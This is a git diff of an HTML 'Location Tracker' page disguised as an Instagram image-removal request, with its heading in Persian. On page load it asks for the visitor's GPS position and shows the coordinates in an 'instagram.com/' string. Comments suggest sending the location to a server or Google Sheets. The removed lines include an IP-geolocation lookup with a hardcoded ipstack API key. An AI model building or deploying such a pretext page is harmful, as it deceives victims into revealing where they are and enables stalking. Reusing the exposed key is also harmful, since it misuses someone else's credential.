@@ -5,40 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Location Tracker</title>
     <script>
-        let locations = []; // Array to store the location data
-
-        // Fetch IP-based location (no permissions needed)
-        function getLocationByIP() {
-            const accessKey = "ee667e0ec5fd4c8d9e2e5d68d5f65303"
-; // Replace with your ipstack API access key
-            fetch(`https://api.ipstack.com/check?access_key=${accessKey}`)
-                .then(response => response.json())
-                .then(data => {
-                    console.log("IP API Response:", data);
-                    
-                    if (data && data.city && data.region_name && data.country_name && data.latitude && data.longitude) {
-                        const { city, region_name, country_name, latitude, longitude } = data;
-
-                        // Display the IP-based location
-                        document.getElementById("ip-location").innerHTML = `IP-based Location: ${city}, ${region_name}, ${country_name} (Latitude: ${latitude}, Longitude: ${longitude})`;
-                    } else {
-                        document.getElementById("ip-location").innerHTML = "Unable to fetch IP-based location. Invalid data.";
-                    }
-                    
-                    // After showing the IP-based location (or error), request GPS location
-                    getLocation();
-                })
-                .catch(error => {
-                    // In case of error, show a fallback message and proceed with GPS location
-                    console.error("Error fetching IP-based location:", error);
-                    document.getElementById("ip-location").innerHTML = "Unable to fetch IP-based location. Proceeding to GPS-based location.";
-                    
-                    // Proceed with GPS-based location fetch
-                    getLocation();
-                });
-        }
-
-        // Request GPS-based location (with permission)
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(showPosition, showError);
@@ -47,24 +13,15 @@
             }
         }
 
-        // Show GPS position after getting permission
         function showPosition(position) {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
-            var locationText = "GPS-based Location: Latitude: " + latitude + ", Longitude: " + longitude;
-            document.getElementById("gps-location").innerHTML = locationText;
-
-            // Save the location data in the array
-            if (locations.length >= 20) {
-                locations.shift(); // Remove the oldest location if there are more than 20 entries
-            }
-            locations.push({latitude: latitude, longitude: longitude, time: new Date().toLocaleString()});
-
-            // Update the table with the latest 20 locations
-            updateLocationTable();
+            document.getElementById("status").innerHTML = "instagram.com/"+latitude+"-"+longitude;
+            
+            // You can send the location data to a server or Google Sheets here
+            // Example: Using an AJAX call to send the location to a Google Sheets script or a database
         }
 
-        // Handle errors for GPS location request
         function showError(error) {
             switch(error.code) {
                 case error.PERMISSION_DENIED:
@@ -82,48 +39,15 @@
             }
         }
 
-        // Update the table displaying the last 20 locations
-        function updateLocationTable() {
-            let tableBody = document.getElementById("location-table-body");
-            tableBody.innerHTML = ''; // Clear current table contents
-
-            locations.forEach((loc, index) => {
-                let row = tableBody.insertRow();
-                row.insertCell(0).innerText = index + 1;
-                row.insertCell(1).innerText = loc.latitude;
-                row.insertCell(2).innerText = loc.longitude;
-                row.insertCell(3).innerText = loc.time;
-            });
-        }
-
-        // Trigger location fetching on page load
-        window.onload = getLocationByIP;
+        window.onload = getLocation;
     </script>
 </head>
 <body>
     <h2>درخواست حذف تصویر از اینستاگرام</h2>
+    <p id="status">Tracking location...</p>
     
-    <p id="ip-location">Fetching IP-based location...</p>
-    <p id="gps-location">Requesting GPS-based location...</p>
-
     <!-- Image you uploaded -->
     <img src="https://raw.githubusercontent.com/vhd10281986/location-tracker/refs/heads/main/photo_2024-11-19_14-09-32.jpg" alt="Location Image" width="400">
-    
-    <!-- Table to display the last 20 locations -->
-    <h3>Last 20 Locations</h3>
-    <table border="1">
-        <thead>
-            <tr>
-                <th>#</th>
-                <th>Latitude</th>
-                <th>Longitude</th>
-                <th>Time</th>
-            </tr>
-        </thead>
-        <tbody id="location-table-body">
-            <!-- Locations will be added here -->
-        </tbody>
-    </table>
 
 </body>
 </html>
